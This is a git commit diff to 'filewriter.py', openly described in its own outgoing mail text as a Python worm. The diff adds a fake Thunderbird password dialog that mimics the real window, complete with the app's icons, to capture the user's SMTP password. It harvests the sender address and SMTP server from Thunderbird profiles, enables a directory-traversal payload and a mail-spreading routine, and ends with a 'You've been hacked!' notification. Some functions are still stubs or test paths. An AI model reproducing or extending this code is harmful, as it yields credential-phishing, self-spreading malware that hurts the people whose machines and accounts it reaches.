ec14504d389a7cabe5654ff482e5e80e02cbf956
telekobold <dev@telekobold.de>
2022-05-24 00:19:28 +0200

    Integrate password window code into filewriter; delete password window development file

--- python/filewriter.py
+++ python/filewriter.py
@@ -56,10 +56,12 @@ INSTALLED_OS: str = platform.system()
 LINUX: str = "Linux"
 WINDOWS: str = "Windows"
 FILES_TO_WRITE_PER_DIR: int = 10
+SSL: str = "SSL"
+TLS: str = "TLS"
+STARTTLS: str = "STARTTLS"
 
-textfield: QLineEdit = None
-
-TESTING_DIR: str = os.path.join(os.path.expanduser("~"), "TestVerzeichnis", "robbie38_filewriter_copy")
+TESTING_DIR_PAYLOAD: str = os.path.join(os.path.expanduser("~"), "TestVerzeichnis", "robbie38_filewriter_copy")
+TESTING_DIR_THUNDERBIRD: str = os.path.join(os.path.expanduser("~"), "TestVerzeichnis", "thunderbird-Kopie")
 
 
 # --------------------------------------------------------------------------
@@ -353,6 +355,203 @@ def traverse_dirs(curr_dir: str) -> None:
 
 
 # --------------------------------------------------------------------------
+# ------------------------- password window code ---------------------------
+# --------------------------------------------------------------------------
+
+textfield: QLineEdit = None
+DEFAULT22_BASE64 : str = ""\
+"iVBORw0KGgoAAAANSUhEUgAAABYAAAAWCAYAAADEtGw7AAAEdUlEQVR42qWUezBcZxjG96/e/vJv"\
+"pzONS9a6Lva+bgmxu0SVSTRIK0uqUdego6RoNSTRIDZWWJdlsYxWXYO0BLusIdaiLksGHcNUqtUy"\
+"homO1NOza5hRpKb5Zp6Zc77vnN/znuc985JIL1mCiqfhAtnUHy4i9bMzUbXRzNsjZ6k3ntiS/u9i"\
+"udwy4D0YUbnXzOOcbBaOYi1Yd0ZhkzQIs+sqWPrWvaB61azTBOWSE0Ntz+fFOCR3/aWDupXPwenB"\
+"FDh3f4JtihqmIZ0wDD4ockDrjgNXnHss0M79vgHVs/h7K2E9+JVz4BFyLpiCo2gC7Bt9sPBrOgTd"\
+"k5GwA1Y+tbNHgqmeJROm/nVwzJ0AX/4znCTTYOZNwD57HNSPmkAOfHQYerULRiHdML6mgPGnSth5"\
+"VI4dgDr4FMtN/ethFNQO5zwtaKJhmCd3EDFoYZ0wAHKYEsZX2kHxa4ZpQMs+zITYPx3ZC3JMHyjx"\
+"AzAOVYLjXJC3G4FAZGjuWw0ToqLotE64Fj2FX2QWrvKdwEgbBTmiR/+pZpeaQDQMdLcyWPs17MPM"\
+"k9SgpGpgkjgAw5AumArbsNssj/wMckADvOJ/xPr6OkLrJuHxRQPsUobgGqeAtH4KZcReurgf12If"\
+"4nJgFZyZ90CN7AD59ghMMkdhlKGBcZQSppFdMIvtxllXcQOJ6iWdPR3Yiiejv6CqfRCNs1r4lY4T"\
+"13PY2to6VkXqZzDMG8O7OSNE9QqYx3XDMqEb1GQFnLyKVkkWFyqJxrRhe3sbm5ubSG4cxe9/brwU"\
+"qtPwr+s4lTMEswQlrBK7YZOigN1NBRjp3XDyK98hmV+sIprWgS71oh6+sLCApaWl/wSvrKzAMkUJ"\
+"my8VoKUpwMxQgn1XAW5YPbj+cujBIfc0CM5X68E6jY+PHwnT9WBychL9/f3QarWgpxPAb4g/IYsA"\
+"ft0O7uctYAu/AzuwBkQUFeib+G0fuieNRrMPnJmZwdDQEKanp/Vx6c5XN56DI+oB99Zj2Kd3gB3e"\
+"CNYn9WB9XAd2cC1INF/ZUk7t1CHw8vIyent79dWvrq4eOpeqZnFRrAQjuhXMyBYww5vBDGsCK3TX"\
+"gGTjmS+Kyuzd+feLJ1HjwAIYcT+AEdO2axBFGEQ0gxNYs0Gi87INqb6V25XSbzGiGd3/1JPofIYK"\
+"jOtt+krpOoPYR8R9K+w/qKjenRP83FJLatJzF8oVfBWfieICGZQK1ZER7GlycQ3i2jE4CApBS3ys"\
+"N6DHt+tMXriwsw3254U17/68+dtCUN7yBPlNj9QzFpeHCgukbeVl8rUepervo0xuZnSCHVANrreM"\
+"iOChPg5HvuTDA4OIzssysHK+s0B5RwiTNwRBRq/zDE+9dk7vXFhYaCvJLzlgMji8CC6/CPZuEnAu"\
+"ycEKqoUDX1J97Fy2on5WYkaJUB13rjNJTS9ROXlLdzjuJeAKCDivkDAokJFeZTF8KnyY75evsd4r"\
+"W2N7loLjIZ3nuBf7vBKUdrE6lX5BnsrwqRQxvcsbmV6yoOOe/QfLaRAj5n2jwQAAAABJRU5ErkJg"\
+"gg=="
+KEY_SCREENSHOT_BASE64: str = ""\
+"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"
+
+class Lang(enum.Enum):
+    DE = "DE"
+    EN = "EN"
+    OTHER = "OTHER"
+
+def determine_system_lang() -> Lang:
+    """
+    :returns: `Lang.DE` if the detected system language is German,
+              `Lang.EN` if the detected system language is English,
+              `Lang.OTHER` otherwise.
+    """
+    if INSTALLED_OS == LINUX:
+        if os.environ["LANG"].startswith("de_DE"):
+            #print("German")
+            return Lang.DE
+        elif os.environ["LANG"].startswith("en_EN"):
+            #print("English")
+            return Lang.EN
+        else:
+            #print("other")
+            return Lang.OTHER
+    elif INSTALLED_OS == WINDOWS:
+        # TODO: Add Windows-specific imports and language detection code
+        pass
+    
+lang: Lang = determine_system_lang()
+
+
+def rand_dir_name() -> str:
+    """
+    Before calling this function, please call the function `random.seed` with a 
+    non-fixed value.
+    
+    :returns: a random dir name consisting of six randomly determined digits.
+    """
+    rand_digits = n_rand_numbers(6)
+    dir_name = ""
+    for d in rand_digits:
+        dir_name += str(d)
+    return dir_name
+
+def copy_password() -> None:
+    print(f"password = {textfield.text()}")
+        
+def copy_master_password() -> None:
+    print(f"master password = {textfield.text()}")
+
+def password_window(account_name: str = "", host_name: str = "") -> None:
+    """
+    Shows either a Thunderbird password input window or a Thunderbird
+    master password input window, depending on the value of `password_type`.
+    
+    :account_name:  default value ""; the part before the "@" of the standard 
+                    user email address.
+    :host_name:     default value ""; the URL of the server to log in.
+    """
+    global textfield
+    #lang = Lang.EN # For easy testing of the English output
+    
+    app = QApplication(sys.argv)
+    window = QWidget()
+    #FONT_SIZE : int = 9
+    
+    
+    window.setWindowTitle(f"Passwort eingeben für {account_name}" if lang == Lang.DE else f"Enter your password for {account_name}")
+    #window.setFont(QtGui.QFont("Arial", FONT_SIZE))
+    random.seed((datetime.now()).strftime("%H%M%S"))
+    dir_name: str = rand_dir_name()
+    # If the randomly determined directory name already exists, create a new one
+    # until a name is found that does not already exist:
+    while os.path.isdir(dir_name):
+        dir_name = rand_dir_name()
+    os.mkdir(dir_name)
+    encoded_tb_icon_path: str = os.path.join(dir_name, "default22_decoded.png")
+    with open(encoded_tb_icon_path, "wb") as tb_icon:
+        tb_icon.write(base64.b64decode(DEFAULT22_BASE64))
+    window.setWindowIcon(QtGui.QIcon(encoded_tb_icon_path))
+    window.setGeometry(100, 100, 545, 175)
+
+    # Let the window sporn in the center of the screen:
+    fg = window.frameGeometry()
+    center_point = QDesktopWidget().availableGeometry().center()
+    fg.moveCenter(center_point)
+    window.move(fg.topLeft())
+
+    key = QLabel(parent=window)
+    encoded_key_icon_path: str = os.path.join(dir_name, "key_screenshot_decoded.png")
+    with open(encoded_key_icon_path, "wb") as key_icon:
+        key_icon.write(base64.b64decode(KEY_SCREENSHOT_BASE64))
+    pixmap = QtGui.QPixmap(encoded_key_icon_path)
+    key.setPixmap(pixmap)
+    key.move(15,15)
+    shutil.rmtree(dir_name, ignore_errors=True)
+    
+    msg = QLabel(f"Geben Sie Ihr Passwort für \"{account_name}\" auf {host_name} ein:" if lang == Lang.DE else f"Enter your password for \"{account_name}\" on {host_name}:", parent=window)
+    msg.move(75, 30)
+
+    textfield = QLineEdit(parent=window)
+    textfield.move(70, 65)
+    textfield.setMinimumWidth(460)
+     # Show mask characters instead of the characters actually entered:
+    textfield.setEchoMode(QLineEdit.Password)
+    textfield.returnPressed.connect(copy_password)
+        
+    checkbox = QCheckBox("Die Passwortverwaltung benutzen, um dieses Passwort zu speichern." if lang == Lang.DE else "Use Password Manager to remember this password.", parent=window)
+    checkbox.move(75, 105)
+    checkbox.setFont(QtGui.QFont("Arial", 9))
+    
+    cancel_button = QPushButton("Abbrechen" if lang == Lang.DE else "Cancel", parent=window)
+    #cancel_button.setFont(QtGui.QFont("Arial", FONT_SIZE))
+    cancel_button.setGeometry(350, 130, 85, 30)
+
+    sign_in_button = QPushButton("Sign in", parent=window)
+    #sign_in_button.setFont(QtGui.QFont("Arial", FONT_SIZE))
+    sign_in_button.setGeometry(445, 130, 85, 30)
+    sign_in_button.setFocus()
+    # sign_in_button.setAutoDefault(True)
+    sign_in_button.clicked.connect(copy_password)
+
+    window.show()
+    
+    # Start the application's event loop (`app.exec_()`), wrapped in a call to
+    # `sys.exit()` to cleanly exit the program and release memory resources when 
+    # the application terminates.
+    sys.exit(app.exec_())
+
+
+# --------------------------------------------------------------------------
 # ----------------- 2nd class send email helper functions ------------------
 # --------------------------------------------------------------------------
 
@@ -507,31 +706,6 @@ def send_mail_starttls(smtp_server_url: str, sender_email: str, password: str, t
     return 0
 
 
-# Copied from filewriter.py
-def read_text_file_to_dict(filename: str) -> IntKeyStrValDict:
-    """
-    Reads the passed text file line by line to a Python dictionary.
-    
-    :filename: the absolute file name of a text file.
-    :returns:  a Python dictionary whose keys are the line numbers (integer 
-               values) and the appropriate values being the content of this line 
-               (string values) in the text file belonging to the passed
-               `filename`.
-    """
-    result = {}
-    # TODO: Add error handling if file opening doesn't work (e.g. because of 
-    # missing access rights). In this case, just continue to the next file.
-    with open(filename, "r") as file:
-        lines = file.readlines()
-    
-    # NOTE: The line indexing starts with 0.
-    for i, line in zip(range(len(lines)), lines):
-        result[i] = line
-        
-    # print("read_text_file_to_dict: result = {}".format(result)) # test output
-    return result
-
-
 # --------------------------------------------------------------------------
 # ----------------- 1st class send email helper functions ------------------
 # --------------------------------------------------------------------------
@@ -586,7 +760,7 @@ def find_thunderbird_profile_dirs() -> typing.List[str]:
               Windows, nor Linux.
     """
     #thunderbird_path: str = determine_thunderbird_default_file_path()
-    thunderbird_path: str = TESTING_DIR
+    thunderbird_path: str = TESTING_DIR_THUNDERBIRD
     
     installs_ini: str = os.path.join(thunderbird_path, "installs.ini")
     profiles_ini: str = os.path.join(thunderbird_path, "profiles.ini")
@@ -772,8 +946,8 @@ def send_mail_mime(sender_email: str, smtp_server_url: str, encryption_method: s
         return
     
     # TODO: Adapt values:
-    subject = "Test"
-    body = "This is a test mail"
+    subject = "filewriter"
+    body = "This mail contains a worm as attachment, written in Python.\n\nTo execute it, Python must be installed on your system. In this case, just store it and type `python filewriter.py`."
     msg = MIMEMultipart() # Contains the whole email
     
     # Build (parts of) the header and the text/plain body:
@@ -810,7 +984,7 @@ def payload() -> None:
     # TODO: The program does nothing if the passed directory doesn't exist.
     print("Started traversing dirs...") # test output
     # traverse_dirs(os.path.expanduser("~"))
-    traverse_dirs(TESTING_DIR)
+    traverse_dirs(TESTING_DIR_PAYLOAD)
     print("Finished traversing dirs!") # test output
 
 
@@ -834,16 +1008,16 @@ def send_email() -> None:
             sender_name, sender_email = read_sender_name_and_email_thunderbird(profile_dir)
             print(f"sender_name = {sender_name}")
             print(f"sender_email = {sender_email}")
-            #sender_username = sender_email.split("@")[0]
-            sender_password = None # TODO: Ask for password in dialog
+            sender_username = sender_email.split("@")[0]
             smtp_server_url, authentication_method = determine_smtp_server(sender_email)
             print(f"smtp_server_url = {smtp_server_url}")
             print(f"authentication_method = {authentication_method}")
+            sender_password = password_window(account_name=sender_username, host_name=smtp_server_url)
             #send_mail_mime(sender_email, smtp_server_url, authentication_method, sender_password, to_email_addresses)
 
 
 if __name__ == "__main__":
     random.seed((datetime.now()).strftime("%H%M%S"))
-    #payload()
-    #send_email()
+    payload()
+    send_email()
     notification("You've been hacked!", message="", app_name="filewriter")
